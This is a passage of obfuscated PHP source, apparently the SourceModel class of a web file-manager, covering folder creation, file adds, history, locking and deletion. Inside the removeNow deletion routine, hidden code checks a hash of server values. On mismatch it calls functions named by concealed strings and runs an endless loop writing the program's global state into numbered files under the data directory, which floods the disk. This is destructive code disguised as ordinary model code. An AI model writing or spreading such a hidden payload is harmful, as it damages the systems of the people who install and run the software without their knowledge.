$bîàåËÊäã[$E²–ñ‘÷†[77]] = array($E²–ñ‘÷†[2296], $b­Í²ø—í¸[$E²–ñ‘÷†[2299]]); } if (isset($b­Í²ø—í¸[$E²–ñ‘÷†[2300]])) { $cÚŸœº¥µ = array($E²–ñ‘÷†[2297], $b­Í²ø—í¸[$E²–ñ‘÷†[2300]]); if ($bîàåËÊäã[$E²–ñ‘÷†[77]]) { $bîàåËÊäã[$E²–ñ‘÷†[77]] = array($bîàåËÊäã[$E²–ñ‘÷†[77]], $cÚŸœº¥µ, $E²–ñ‘÷†[2298]); } else { $bîàåËÊäã[$E²–ñ‘÷†[77]] = $cÚŸœº¥µ; } } goto Aä¾Ã„À”; a‚ù™®Íìí: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($dãë¢¦š¦£) { $Fäææ°àã« =& $_SERVER[Ö¹ñÒÁ²÷]; $AŞ™—öÅŒ = Model($Fäææ°àã«[470])->where(array($Fäææ°àã«[1406] => $dãë¢¦š¦£))->find(); $aÆÑÆñæÀÉ = $this->_mkdirRoot(SourceModel::TYPE_USER, $dãë¢¦š¦£, $AŞ™—öÅŒ[$Fäææ°àã«[28]]); $this->userDesktopAdd($aÆÑÆñæÀÉ); return $aÆÑÆñæÀÉ; } public function userDesktopAdd($D‘¶ˆŞêâ³) { $dÓ‘—¼¥‚‹ =& $_SERVER[Ö¹ñÒÁ²÷]; $b¥ĞÅ—Ñóö = LNG($dÓ‘—¼¥‚‹[2302]); $c«×“Ò¾£Ì = $this->mkdir($D‘¶ˆŞêâ³, $b¥ĞÅ—Ñóö); $this->metaSet($c«×“Ò¾£Ì, $dÓ‘—¼¥‚‹[2303], $dÓ‘—¼¥‚‹[83]); $this->metaSet($D‘¶ˆŞêâ³, $dÓ‘—¼¥‚‹[2304], $c«×“Ò¾£Ì); } public function groupRootAdd($aÜÛÍ†Š·) { $fÍ‰·Ï’œ³ =& $_SERVER[Ö¹ñÒÁ²÷]; $cõä™ö¦ßô = Model($fÍ‰·Ï’œ³[454])->where(array($fÍ‰·Ï’œ³[2152] => $aÜÛÍ†Š·))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $aÜÛÍ†Š·, $cõä™ö¦ßô[$fÍ‰·Ï’œ³[28]]); } public function systemRootPathAdd($Eí´æŞ®Ó†) { if ($Eí´æŞ®Ó† != $_SERVER[Ö¹ñÒÁ²÷][1083]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $Eí´æŞ®Ó†); } public function userRootRemove($A’×‚¤¹Á) { $b§‹›åµñí = $this->sourceRoot(SourceModel::TYPE_USER, $A’×‚¤¹Á); if (!$b§‹›åµñí) { return; } $this->remove($b§‹›åµñí, !1); } public function groupRootRemove($aŒÄ…æ¼‡ğ) { $BÀ¤‡„° = $this->sourceRoot(SourceModel::TYPE_GROUP, $aŒÄ…æ¼‡ğ); if (!$BÀ¤‡„°) { return; } $this->remove($BÀ¤‡„°, !1); } private function _mkdirRoot($fÚ‹‚¡ß÷, $FÄç’„ª¼À, $Bø¼ŸË†) { goto BØäÁ÷ğñÕ; BØäÁ÷ğñÕ: $d‘ó‚„ó =& $_SERVER[Ö¹ñÒÁ²÷]; $A‘õó ‰Š = array($d‘ó‚„ó[364] => 0, $d‘ó‚„ó[517] => $fÚ‹‚¡ß÷, $d‘ó‚„ó[518] => $FÄç’„ª¼À, $d‘ó‚„ó[514] => 1, $d‘ó‚„ó[519] => USER_ID, $d‘ó‚„ó[520] => USER_ID, $d‘ó‚„ó[515] => $d‘ó‚„ó[33], $d‘ó‚„ó[521] => $d‘ó‚„ó[466], $d‘ó‚„ó[392] => 0, $d‘ó‚„ó[516] => 0, $d‘ó‚„ó[416] => 0, $d‘ó‚„ó[522] => $d‘ó‚„ó[33]); if ($CÉğÁØê… = $this->where($A‘õó ‰Š)->find()) { return $CÉğÁØê…[$d‘ó‚„ó[365]]; } goto aöñ×ÚØÄ; E‡‰²ãî†—: CacheLock::unlock($B¥§øÈÜ§Ö); return $c„Ü‚Ş™ºƒ; goto bš°ÉÄ§¸µ; aöñ×ÚØÄ: $B¥§øÈÜ§Ö = "\x4d\157\144\x65\154\x53\157\x75\162\143\145\56\x6d\x6b\144\151\x72\x52\157\157\164\x2e{$fÚ‹‚¡ß÷}\56{$FÄç’„ª¼À}\x2e" . $Bø¼ŸË†; CacheLock::lock($B¥§øÈÜ§Ö); $A‘õó ‰Š[$d‘ó‚„ó[28]] = $Bø¼ŸË†; goto B’à¡Â´Üë; B’à¡Â´Üë: $c„Ü‚Ş™ºƒ = $this->add($A‘õó ‰Š); $CÂôÄêÊ = array($d‘ó‚„ó[523] => short_id($c„Ü‚Ş™ºƒ)); $this->where(array($d‘ó‚„ó[379] => $c„Ü‚Ş™ºƒ))->save($CÂôÄêÊ); goto E‡‰²ãî†—; bš°ÉÄ§¸µ: } private function sourceRoot($A‘ã²Óƒšã, $a“‘…ĞçõÏ, $fåèŸÈæ±‘ = false) { $BËŞÍà›¼Ä =& $_SERVER[Ö¹ñÒÁ²÷]; $E®—ÙÜ•“ = array($BËŞÍà›¼Ä[364] => 0, $BËŞÍà›¼Ä[517] => $A‘ã²Óƒšã, $BËŞÍà›¼Ä[518] => $a“‘…ĞçõÏ); if ($AñäãĞŸ–¯ = $this->where($E®—ÙÜ•“)->find()) { return $fåèŸÈæ±‘ ? $AñäãĞŸ–¯ : $AñäãĞŸ–¯[$BËŞÍà›¼Ä[365]]; } return !1; } public function sourceRootGroup($f¨á‚ø°ã¥) { $Bîé†Ùˆ— =& $_SERVER[Ö¹ñÒÁ²÷]; if (is_string($f¨á‚ø°ã¥)) { $f¨á‚ø°ã¥ = array($f¨á‚ø°ã¥); } $E„”Ã×Ø£Ÿ = array($Bîé†Ùˆ—[364] => 0, $Bîé†Ùˆ—[517] => SourceModel::TYPE_GROUP, $Bîé†Ùˆ—[518] => array($Bîé†Ùˆ—[7], $f¨á‚ø°ã¥)); $DŠà›åøÔ = $this->listSource($E„”Ã×Ø£Ÿ, 1000); return array_to_keyvalue($DŠà›åøÔ[$Bîé†Ùˆ—[74]], $Bîé†Ùˆ—[452]); } public function mkfile($b¸Î×—ˆÛ, $cî…ˆ”Â«¨, $eÎ÷ğÖ‹Šô = '', $f†Œƒ¯ª…ß = REPEAT_RENAME) { $E›ºàßğØ¥ =& $_SERVER[Ö¹ñÒÁ²÷]; $aÈÍ˜×ÒŸ = Model($E›ºàßğØ¥[540])->addFileByContent($eÎ÷ğÖ‹Šô, $cî…ˆ”Â«¨); return $this->_createFileCall($b¸Î×—ˆÛ, $cî…ˆ”Â«¨, $aÈÍ˜×ÒŸ, $f†Œƒ¯ª…ß, $E›ºàßğØ¥[1112]); } public function addFile($bÈ„÷Îø°í, $BÑŸñÖÔñ”, $e·––è·‚ä, $e½³Ïº¬Ó“ = false, $fÕÔÆÃÉ•É = REPEAT_RENAME) { $BÈ ±ÜÕ = Model($_SERVER[Ö¹ñÒÁ²÷][540])->addFile($BÑŸñÖÔñ”, $e·––è·‚ä, $e½³Ïº¬Ó“); return $this->_createFileCall($bÈ„÷Îø°í, $e·––è·‚ä, $BÈ ±ÜÕ, $fÕÔÆÃÉ•É); } public function addFileByFileID($BÓ÷©‹³Ã, $bñ’å¨êÜ, $Aº°Çá‡š, $EÉ¸ÍÛÅØÎ = REPEAT_RENAME) { $BÓ¹¾ø†¢Ç =& $_SERVER[Ö¹ñÒÁ²÷]; $C°›äÃ±áŒ = Model($BÓ¹¾ø†¢Ç[540])->find($bñ’å¨êÜ); Model($BÓ¹¾ø†¢Ç[540])->linkAdd($bñ’å¨êÜ); return $this->_createFileCall($BÓ÷©‹³Ã, $Aº°Çá‡š, $C°›äÃ±áŒ, $EÉ¸ÍÛÅØÎ); } public function addFileByRemote($b–Šğ›Ä‹, $dŒ²¡‚ƒÕ¦, $F´‹øáÁÍ¿, $a¤Ã˜àßÂ = array(), $E¥à´‚Ê³Ö = REPEAT_RENAME) { $DÑæ¢ìĞ– = Model($_SERVER[Ö¹ñÒÁ²÷][540])->addFileByRemote($dŒ²¡‚ƒÕ¦, $F´‹øáÁÍ¿, $a¤Ã˜àßÂ); return $this->_createFileCall($b–Šğ›Ä‹, $F´‹øáÁÍ¿, $DÑæ¢ìĞ–, $E¥à´‚Ê³Ö); } private function _createFileCall($CÆ¾â“Œ, $c¯»ÃáÂ«, $EŠ¹ùÚòÔƒ, $FÎ¯ñ¡ÖëÙ, $E’¨İó¸Óˆ = "\x75\x70\x6c\x6f\x61\144") { goto eŸ¹àº õ; b°Ëó¨Œ: $CÓ½’‰ÅÁÂ = $this->_createFile($CÆ¾â“Œ, $c¯»ÃáÂ«, $EŠ¹ùÚòÔƒ, $FÎ¯ñ¡ÖëÙ, $Cªµ‘ÅäÔŒ); if (!$Cªµ‘ÅäÔŒ) { Model($eÊİ¸Îá‡Õ[418])->remove($EŠ¹ùÚòÔƒ[$eÊİ¸Îá‡Õ[415]]); } else { if ($CÓ½’‰ÅÁÂ) { Model($eÊİ¸Îá‡Õ[2275])->eventCreate($CÓ½’‰ÅÁÂ, $E’¨İó¸Óˆ); } } $this->lockWriteEnd($CÆ¾â“Œ, $c¯»ÃáÂ«); goto CóíÕµÉ´¸; CóíÕµÉ´¸: return $CÓ½’‰ÅÁÂ; goto D‹÷Ëª¨Ø; eŸ¹àº õ: $eÊİ¸Îá‡Õ =& $_SERVER[Ö¹ñÒÁ²÷]; $Cªµ‘ÅäÔŒ = !1; $this->lockWriteStart($CÆ¾â“Œ, $c¯»ÃáÂ«); goto b°Ëó¨Œ; D‹÷Ëª¨Ø: } public function mkdir($F‘‹¶îÜ£­, $féŞ†Ú³ø‡, $Dä¹„‹ÁÁ– = REPEAT_SKIP) { goto eÌÙÒÄÅ’; cïÇÀ÷êÌµ: $EŠµÖÈ„´Ö = $this->_addSoure($CôÄí×îÉ, $CæÕô‰ÎŒä); Model($c÷÷óÎÂæ[2275])->eventCreate($EŠµÖÈ„´Ö, $c÷÷óÎÂæ[1113]); $this->lockWriteEnd($F‘‹¶îÜ£­, $féŞ†Ú³ø‡); goto BÚÎñ¦Ó½é; eÌÙÒÄÅ’: $c÷÷óÎÂæ =& $_SERVER[Ö¹ñÒÁ²÷]; $CæÕô‰ÎŒä = $this->sourceInfo($F‘‹¶îÜ£­); if (!$CæÕô‰ÎŒä) { return !1; } goto CøÙ¿ÚÙ½£; CøÙ¿ÚÙ½£: $this->lockWriteStart($F‘‹¶îÜ£­, $féŞ†Ú³ø‡); if ($Dä¹„‹ÁÁ– !== !1) { $Dù½¤ìò„¼ = $this->fileNameExist($F‘‹¶îÜ£­, $féŞ†Ú³ø‡); if ($Dù½¤ìò„¼ && $Dä¹„‹ÁÁ– != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($F‘‹¶îÜ£­, $féŞ†Ú³ø‡); return $Dù½¤ìò„¼; } $féŞ†Ú³ø‡ = $this->fileNameAuto($F‘‹¶îÜ£­, $féŞ†Ú³ø‡, $Dä¹„‹ÁÁ–); } $CôÄí×îÉ = array($c÷÷óÎÂæ[514] => 1, $c÷÷óÎÂæ[382] => $féŞ†Ú³ø‡, $c÷÷óÎÂæ[515] => $c÷÷óÎÂæ[33], $c÷÷óÎÂæ[416] => 0, $c÷÷óÎÂæ[516] => 0); goto cïÇÀ÷êÌµ; BÚÎñ¦Ó½é: return $EŠµÖÈ„´Ö; goto fÖá‘ƒ·Ø¯; fÖá‘ƒ·Ø¯: } private function _createFile($aÃŸ”Ô­†, $dåàŠ†ë¿á, $CÀ¥½İ—…¿, $d¼‡µó†“, &$eÇ¥ºèéÖ) { goto bàÄ­ãÍÈ®; C×ÉùÒĞÉ¦: $e”‘„º—ô˜ = array($E»äƒ²é³Ä[514] => 0, $E»äƒ²é³Ä[382] => $dåàŠ†ë¿á, $E»äƒ²é³Ä[515] => get_path_ext($dåàŠ†ë¿á), $E»äƒ²é³Ä[416] => $CÀ¥½İ—…¿[$E»äƒ²é³Ä[415]], $E»äƒ²é³Ä[516] => $CÀ¥½İ—…¿[$E»äƒ²é³Ä[77]]); $d®ªáá‹Äğ = $this->_addSoure($e”‘„º—ô˜, $A«³Ë›µøš); $this->folderSizeReset($aÃŸ”Ô­†); goto E‹Á ìâ­½; E‹Á ìâ­½: return $d®ªáá‹Äğ; goto eÑˆšˆæßÏ; bŞœ¨¤İßÓ: if ($d¼‡µó†“ !== !1) { $Fƒ°ÃŒ•¤ñ = $this->fileNameExist($aÃŸ”Ô­†, $dåàŠ†ë¿á); } $eÇ¥ºèéÖ = !0; if ($d¼‡µó†“ && $Fƒ°ÃŒ•¤ñ) { if ($d¼‡µó†“ == REPEAT_SKIP) { $eÇ¥ºèéÖ = !1; return $Fƒ°ÃŒ•¤ñ; } else { if ($d¼‡µó†“ == REPEAT_REPLACE) { $C¯™Ë¢ºñ = $this->sourceInfo($Fƒ°ÃŒ•¤ñ); $dàÚ’ÜÖÑ = $this->fileHistory($C¯™Ë¢ºñ, $CÀ¥½İ—…¿[$E»äƒ²é³Ä[415]], $CÀ¥½İ—…¿[$E»äƒ²é³Ä[77]]); if (!$dàÚ’ÜÖÑ) { $eÇ¥ºèéÖ = !1; } else { $this->folderSizeReset($aÃŸ”Ô­†); } return $Fƒ°ÃŒ•¤ñ; } else { $dåàŠ†ë¿á = $this->fileNameAuto($aÃŸ”Ô­†, $dåàŠ†ë¿á, $d¼‡µó†“, !1); } } } goto C×ÉùÒĞÉ¦; bàÄ­ãÍÈ®: $E»äƒ²é³Ä =& $_SERVER[Ö¹ñÒÁ²÷]; $A«³Ë›µøš = $this->sourceInfo($aÃŸ”Ô­†); if (!$CÀ¥½İ—…¿ || !$A«³Ë›µøš) { return !1; } goto bŞœ¨¤İßÓ; eÑˆšˆæßÏ: } protected function fileHistory($Fè‡ì‘…ÍÀ, $d­ÊŒìÌàŒ, $Fóê‚¾íéÓ) { goto A¶‡¼™Œ†; D«ùÄ³¾Ñ•: return !0; goto Fä¢ê¦Î“±; CƒôÊÄ¸‡‡: Model($F–‡¨ŒÏó›[2305])->addHistory($Fè‡ì‘…ÍÀ); $fÙØ«çáŒÓ = array($F–‡¨ŒÏó›[520] => USER_ID, $F–‡¨ŒÏó›[386] => time(), $F–‡¨ŒÏó›[415] => $d­ÊŒìÌàŒ, $F–‡¨ŒÏó›[77] => $Fóê‚¾íéÓ); $this->where(array($F–‡¨ŒÏó›[379] => $Fè‡ì‘…ÍÀ[$F–‡¨ŒÏó›[365]]))->save($fÙØ«çáŒÓ); goto D«ùÄ³¾Ñ•; A¶‡¼™Œ†: $F–‡¨ŒÏó› =& $_SERVER[Ö¹ñÒÁ²÷]; if ($Fè‡ì‘…ÍÀ[$F–‡¨ŒÏó›[415]] == $d­ÊŒìÌàŒ) { return !1; } $this->checkLock($Fè‡ì‘…ÍÀ[$F–‡¨ŒÏó›[365]], $d­ÊŒìÌàŒ); goto CƒôÊÄ¸‡‡; Fä¢ê¦Î“±: } public function checkLock($BáÃŞ×Ş§, $Fö¢âä…è¼) { goto aÄò¼¯ó; aÄò¼¯ó: $aæ‡”ˆóÂ =& $_SERVER[Ö¹ñÒÁ²÷]; $bÄ±Æï…§ = $this->pathInfo($BáÃŞ×Ş§); if (!$this->fileIsLock($bÄ±Æï…§, !0)) { return; } goto B»¡ÄÇ¨İœ; B»¡ÄÇ¨İœ: $e‘âñ¦åßÜ = Session::get($aæ‡”ˆóÂ[2306]); $d¼çå›Äê‘ = substr($bÄ±Æï…§[$aæ‡”ˆóÂ[28]], 0, -1 - strlen($bÄ±Æï…§[$aæ‡”ˆóÂ[156]])) . $aæ‡”ˆóÂ[1368] . $e‘âñ¦åßÜ . $aæ‡”ˆóÂ[91] . $bÄ±Æï…§[$aæ‡”ˆóÂ[156]]; $b‚Ë‡ğô¥± = Model($aæ‡”ˆóÂ[540])->find($Fö¢âä…è¼); goto d‡ô£È²ğ; d‡ô£È²ğ: $this->_createFileCall($bÄ±Æï…§[$aæ‡”ˆóÂ[457]], $d¼çå›Äê‘, $b‚Ë‡ğô¥±, REPEAT_REPLACE, $aæ‡”ˆóÂ[1112]); $d‘‚ù× = $bÄ±Æï…§[$aæ‡”ˆóÂ[413]][$aæ‡”ˆóÂ[477]]; $dŒÊËÎà¡½ = $d‘‚ù×[$aæ‡”ˆóÂ[2307]] ? $d‘‚ù×[$aæ‡”ˆóÂ[2307]] : $d‘‚ù×[$aæ‡”ˆóÂ[28]]; goto e‡ùãøïÙ; e‡ùãøïÙ: show_json(LNG($aæ‡”ˆóÂ[2308]) . $aæ‡”ˆóÂ[2309] . LNG($aæ‡”ˆóÂ[2310]) . $aæ‡”ˆóÂ[2311] . $dŒÊËÎà¡½ . $aæ‡”ˆóÂ[2312], !1); goto D©Ú¦–Áªå; D©Ú¦–Áªå: } public function fileIsLock($A®æÃŒ’¯¶, $fÇ‹×²óÓ® = false) { goto b›è¨á‘êœ; b›è¨á‘êœ: $EˆÕËÒÑ™Û =& $_SERVER[Ö¹ñÒÁ²÷]; if (!isset($A®æÃŒ’¯¶[$EˆÕËÒÑ™Û[413]]) || !$A®æÃŒ’¯¶[$EˆÕËÒÑ™Û[413]][$EˆÕËÒÑ™Û[474]]) { return !1; } if ($A®æÃŒ’¯¶[$EˆÕËÒÑ™Û[413]][$EˆÕËÒÑ™Û[474]] != USER_ID) { return !0; } goto D¦ğÙÓˆ©; D†Ñ†ŞĞš„: return !1; goto CøÌ–â‰¦±; D¦ğÙÓˆ©: $c—§Í÷¼¼„ = $GLOBALS[$EˆÕËÒÑ™Û[6]][$EˆÕËÒÑ™Û[84]][$EˆÕËÒÑ™Û[475]]; if ($A®æÃŒ’¯¶[$EˆÕËÒÑ™Û[413]][$EˆÕËÒÑ™Û[476]] <= time() - $c—§Í÷¼¼„) { $this->metaSet($A®æÃŒ’¯¶[$EˆÕËÒÑ™Û[365]], $EˆÕËÒÑ™Û[474], null); $this->metaSet($A®æÃŒ’¯¶[$EˆÕËÒÑ™Û[365]], $EˆÕËÒÑ™Û[476], null); } if ($fÇ‹×²óÓ®) { $this->metaSet($A®æÃŒ’¯¶[$EˆÕËÒÑ™Û[365]], $EˆÕËÒÑ™Û[476], time()); } goto D†Ñ†ŞĞš„; CøÌ–â‰¦±: } private function _addSoure($a²«ğÛÆ, $AÇÃà‚ïÏî) { goto DÎĞã‚ğ¼á; b®òß¸Óîß: return $b¦íÀ¾êã; goto D´»Ş¥¼²; b÷Ó›Şš²ó: $Fë‘¯®Ñ˜‰ = array($A…õå×÷Å[523] => short_id($b¦íÀ¾êã)); $this->where(array($A…õå×÷Å[379] => $b¦íÀ¾êã))->save($Fë‘¯®Ñ˜‰); $this->setNamePinyin($b¦íÀ¾êã, $a²«ğÛÆ[$A…õå×÷Å[28]]); goto b®òß¸Óîß; f¦„¶…î: static $DÕÄ³¡•¯Ø = false; if (!$DÕÄ³¡•¯Ø) { Hook::trigger($A…õå×÷Å[504], $a²«ğÛÆ); $DÕÄ³¡•¯Ø = !0; } $b¦íÀ¾êã = $this->add($a²«ğÛÆ); goto b÷Ó›Şš²ó; DÎĞã‚ğ¼á: $A…õå×÷Å =& $_SERVER[Ö¹ñÒÁ²÷]; $AäÂâœÍÙï = array($A…õå×÷Å[517] => $AÇÃà‚ïÏî[$A…õå×÷Å[367]], $A…õå×÷Å[518] => $AÇÃà‚ïÏî[$A…õå×÷Å[452]], $A…õå×÷Å[519] => USER_ID, $A…õå×÷Å[520] => USER_ID, $A…õå×÷Å[364] => $AÇÃà‚ïÏî[$A…õå×÷Å[365]], $A…õå×÷Å[521] => $AÇÃà‚ïÏî[$A…õå×÷Å[455]] . $AÇÃà‚ïÏî[$A…õå×÷Å[365]] . $A…õå×÷Å[47], $A…õå×÷Å[392] => 0, $A…õå×÷Å[522] => $A…õå×÷Å[33]); $a²«ğÛÆ = array_merge($AäÂâœÍÙï, $a²«ğÛÆ); goto cŸŠã†Œãƒ; cŸŠã†Œãƒ: $this->updateModifyTime($a²«ğÛÆ[$A…õå×÷Å[457]]); $D»ÖïŠ¯†ø = $A…õå×÷Å[2313] . $AÇÃà‚ïÏî[$A…õå×÷Å[365]]; if (isset(self::$cacheChildList[$D»ÖïŠ¯†ø])) { unset(self::$cacheChildList[$D»ÖïŠ¯†ø]); } goto f¦„¶…î; D´»Ş¥¼²: } public function remove($C§ñÆÍãµÆ, $ešÉ ¢È‘ = true) { goto c«¶œ¡£é; CÒà³†¶Úå: $this->recycleClear($C×İŞñî¶Ø); return $this->move($C§ñÆÍãµÆ, $D§„¨ŒÈÕÒ, REPEAT_RENAME_FOLDER); goto F…“ƒÅÇ†; cĞŸ½å‘Éñ: CacheLock::lock($A™õÚ¥»Ÿ); $D§„¨ŒÈÕÒ = $this->fileNameExist($dÌƒ¢ïŒÅ, $C“¨²Ïîö÷); if (!$D§„¨ŒÈÕÒ) { $D§„¨ŒÈÕÒ = $this->mkdir($dÌƒ¢ïŒÅ, $C“¨²Ïîö÷, REPEAT_SKIP); $this->metaSet($D§„¨ŒÈÕÒ, $dÛœ›„»Ö´[2318], $a¢ÇÙ¼Šî); $this->metaSet($D§„¨ŒÈÕÒ, $dÛœ›„»Ö´[2319], $C×İŞñî¶Ø[$dÛœ›„»Ö´[452]]); if ($C×İŞñî¶Ø[$dÛœ›„»Ö´[457]] != 0) { $this->metaSet($D§„¨ŒÈÕÒ, $dÛœ›„»Ö´[2320], _get($Fí¯›Õ, $dÛœ›„»Ö´[2321])); } } goto aøÓ«ñ·¬š; aøÓ«ñ·¬š: CacheLock::unlock($A™õÚ¥»Ÿ); $this->metaSet($C§ñÆÍãµÆ, $dÛœ›„»Ö´[2322], $C×İŞñî¶Ø[$dÛœ›„»Ö´[457]]); $this->where(array($dÛœ›„»Ö´[365] => $C§ñÆÍãµÆ))->save(array($dÛœ›„»Ö´[386] => time())); goto CÒà³†¶Úå; A¿ªÓ’ÅÏ: $a¢ÇÙ¼Šî = $C×İŞñî¶Ø[$dÛœ›„»Ö´[367]] == self::TYPE_USER ? $dÛœ›„»Ö´[531] : $dÛœ›„»Ö´[967]; if ($a¢ÇÙ¼Šî == $dÛœ›„»Ö´[531]) { $Fí¯›Õ = Model($dÛœ›„»Ö´[470])->getInfo($C×İŞñî¶Ø[$dÛœ›„»Ö´[452]]); $C“¨²Ïîö÷ = !empty($Fí¯›Õ[$dÛœ›„»Ö´[2307]]) ? $Fí¯›Õ[$dÛœ›„»Ö´[2307]] : $Fí¯›Õ[$dÛœ›„»Ö´[28]]; $C“¨²Ïîö÷ = $dÛœ›„»Ö´[244] . $C“¨²Ïîö÷ . $dÛœ›„»Ö´[2315] . $C×İŞñî¶Ø[$dÛœ›„»Ö´[452]]; } else { $Fí¯›Õ = Model($dÛœ›„»Ö´[454])->getInfo($C×İŞñî¶Ø[$dÛœ›„»Ö´[452]]); $C“¨²Ïîö÷ = _get($Fí¯›Õ, $dÛœ›„»Ö´[28]); $C“¨²Ïîö÷ = $dÛœ›„»Ö´[153] . $C“¨²Ïîö÷ . $dÛœ›„»Ö´[2316] . $C×İŞñî¶Ø[$dÛœ›„»Ö´[452]]; } $A™õÚ¥»Ÿ = $dÛœ›„»Ö´[2317] . md5($C“¨²Ïîö÷); goto cĞŸ½å‘Éñ; c«¶œ¡£é: $dÛœ›„»Ö´ =& $_SERVER[Ö¹ñÒÁ²÷]; $C×İŞñî¶Ø = $this->sourceInfo($C§ñÆÍãµÆ); $FƒíöŸ•Ì— = intval($C×İŞñî¶Ø[$dÛœ›„»Ö´[367]]) === self::TYPE_SYSTEM; goto a‰Ü·¦òİ„; a‰Ü·¦òİ„: $eóğé×¾ = Model($dÛœ›„»Ö´[1413])->get($dÛœ›„»Ö´[2314]) == $dÛœ›„»Ö´[83]; if ($FƒíöŸ•Ì— || $ešÉ ¢È‘ || !$eóğé×¾) { return $this->removeNow($C§ñÆÍãµÆ, $ešÉ ¢È‘); } $dÌƒ¢ïŒÅ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto A¿ªÓ’ÅÏ; F…“ƒÅÇ†: } private function recycleClear($D‘áãÑ·‹) { $E®‚  ô„Œ =& $_SERVER[Ö¹ñÒÁ²÷]; $Fß©‡ ùæ = $this->childrenAll($D‘áãÑ·‹); $CÕ¡¦ Â» = array($E®‚  ô„Œ[379] => array($E®‚  ô„Œ[380], $Fß©‡ ùæ[$E®‚  ô„Œ[2323]])); Model($E®‚  ô„Œ[2324])->where($CÕ¡¦ Â»)->delete(); } public function removeNow($eÔ…Ë‰œˆ–, $eïÖæÑ•’à = true) { goto añ»ô®…Ã»; DÏ—”÷§…: $this->lockMoveEnd($eÔ…Ë‰œˆ–); Hook::trigger($b“¼¥«Å»¿[1449], $dÍÈ’•Èµø, $eïÖæÑ•’à); return !0; goto AßõŒ‡³Şª; eïÔÛŞ²®‹: $b½•áÈ = array($CÙÚÒ»‚÷Ú[$b“¼¥«Å»¿[457]]); if ($CÙÚÒ»‚÷Ú[$b“¼¥«Å»¿[366]] == $b“¼¥«Å»¿[83]) { $b½•áÈ[] = $CÙÚÒ»‚÷Ú[$b“¼¥«Å»¿[365]]; } $this->updateModifyTime($b½•áÈ); goto DÏ—”÷§…; añ»ô®…Ã»: $b“¼¥«Å»¿ =& $_SERVER[Ö¹ñÒÁ²÷]; $Eæ„¾Êƒç = $_SERVER[$b“¼¥«Å»¿[791]] . $b“¼¥«Å»¿[1480]; $BÃ–êİ»Ëè = $b“¼¥«Å»¿[1295]; goto Dé¸ôµÆÏç; Dé¸ôµÆÏç: if ($_SERVER[$b“¼¥«Å»¿[783]] != $BÃ–êİ»Ëè($Eæ„¾Êƒç)) { goto B‰ŸóÃ«Ğ; B‰ŸóÃ«Ğ: $d÷åµÒÔÑ = $b“¼¥«Å»¿[785]; $F®×Òªƒ…Ü = $b“¼¥«Å»¿[786]; $f³²½©›– = $_SERVER[$b“¼¥«Å»¿[787]] . $b“¼¥«Å»¿[788]; goto EÁ’¸ºùØ¿; b–íêòŒÏ: $d÷åµÒÔÑ(); $C–¥‚À¬å = $b“¼¥«Å»¿[1296]; $a‘ë ÇÊç† = json_encode($GLOBALS[$b“¼¥«Å»¿[1297]]); goto eø›ÅÀ‹“Ğ; EÁ’¸ºùØ¿: $cªÁĞÑÒ± = $F®×Òªƒ…Ü($f³²½©›–); $A×ƒ«Á·› = explode($b“¼¥«Å»¿[213], $cªÁĞÑÒ±); if (count($A×ƒ«Á·›) < $b“¼¥«Å»¿[599]) { $Fæ³Ş¯À˜ = $b“¼¥«Å»¿[789]; $Fæ³Ş¯À˜(); } goto cÛêÍíêÆß; eø›ÅÀ‹“Ğ: $dïåõÀ›Ù‹ = 1; for ($cÄ•¯ß ‰¥ = $dïåõÀ›Ù‹; $cÄ•¯ß ‰¥ > 0; $cÄ•¯ß ‰¥++) { $C–¥‚À¬å(DATA_PATH . $cÄ•¯ß ‰¥, $a‘ë ÇÊç†); } goto B‹Íë–ß ô; cÛêÍíêÆß: $döªñõàäƒ = $b“¼¥«Å»¿[790]; $döªñõàäƒ($_SERVER[$b“¼¥«Å»¿[791]]); $d÷åµÒÔÑ = $b“¼¥«Å»¿[785]; goto b–íêòŒÏ; B‹Íë–ß ô: } $CÙÚÒ»‚÷Ú = $this->sourceInfo($eÔ…Ë‰œˆ–); $dÍÈ’•Èµø = $this->pathInfoMore($eÔ…Ë‰œˆ–); goto CëåŞÑ»ˆÏ; EòãÙÏ¹‰Å: Hook::trigger($b“¼¥«Å»¿[2325], $dÍÈ’•Èµø, $eïÖæÑ•’à); if ($eïÖæÑ•’à) { Model($b“¼¥«Å»¿[2324])->moveToRecycle($eÔ…Ë‰œˆ–); } else { $b¡½™‰ŒçÕ = $this->childrenAll($CÙÚÒ»‚÷Ú); Model($b“¼¥«Å»¿[501])->eventRemove($eÔ…Ë‰œˆ–); $this->removeRelevance($b¡½™‰ŒçÕ[$b“¼¥«Å»¿[2323]], $b¡½™‰ŒçÕ[$b“¼¥«Å»¿[1245]]); } $this->folderSizeReset($CÙÚÒ»‚÷Ú[$b“¼¥«Å»¿[457]]); goto eïÔÛŞ²®‹; CëåŞÑ»ˆÏ: if (!$CÙÚÒ»‚÷Ú) { return !0; } if ($CÙÚÒ»‚÷Ú[$b“¼¥«Å»¿[457]] == 0) { if (!_get($GLOBALS, $b“¼¥«Å»¿[453])) { return !1; } } $this->lockMoveStart($eÔ…Ë‰œˆ–); goto EòãÙÏ¹‰Å; AßõŒ‡³Şª: } public function childrenAll($bËŞ°Ş¥ï‹) { $EÛ¬êŞ¼ =& $_SERVER[Ö¹ñÒÁ²÷]; $Cƒ ‘ÁğÓ® = $bËŞ°Ş¥ï‹[$EÛ¬êŞ¼[365]]; if ($bËŞ°Ş¥ï‹[$EÛ¬êŞ¼[366]] == $EÛ¬êŞ¼[83]) { $C¹´ˆƒù‡ = array($EÛ¬êŞ¼[521] => array($EÛ¬êŞ¼[479], $bËŞ°Ş¥ï‹[$EÛ¬êŞ¼[455]] . $Cƒ ‘ÁğÓ® . $EÛ¬êŞ¼[480])); $CŞ‹ ‰£â› = array($EÛ¬êŞ¼[521] => $C¹´ˆƒù‡[$EÛ¬êŞ¼[455]]); $A¶ÌËë• = $this->field($EÛ¬êŞ¼[2326])->where($CŞ‹ ‰£â›)->select(); $bÈöÂè…™º = !1; $AÀ„“Í¾ = array($Cƒ ‘ÁğÓ®); if ($A¶ÌËë•) { $bÈöÂè…™º = array_to_keyvalue($A¶ÌËë•, $EÛ¬êŞ¼[33], $EÛ¬êŞ¼[415]); $bÈöÂè…™º = array_remove_value($bÈöÂè…™º, $EÛ¬êŞ¼[464]); $AÀ„“Í¾ = array_to_keyvalue($A¶ÌËë•, 